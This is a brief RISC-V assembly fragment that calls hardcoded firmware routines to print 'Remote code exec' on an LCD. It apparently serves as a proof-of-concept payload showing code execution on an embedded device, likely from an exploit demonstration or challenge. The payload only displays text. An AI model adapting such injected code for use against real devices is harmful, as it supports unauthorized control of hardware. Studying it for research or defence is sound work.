func:
        # lcd.setCursor(a0=this, a1=0, a2=0)
        li a2, 0
        li a1, 0
        li a0, 0x80000444
        li a5, 0x20401E08
        jalr ra, a5
        # lcd.print(a0=this, a1=string to print)
        li a0, 0x80000444
        lla a1, pwstr
        li a5, 0x20402c62
        jalr ra, a5
pwstr:
        .ascii "Remote code exec\n"

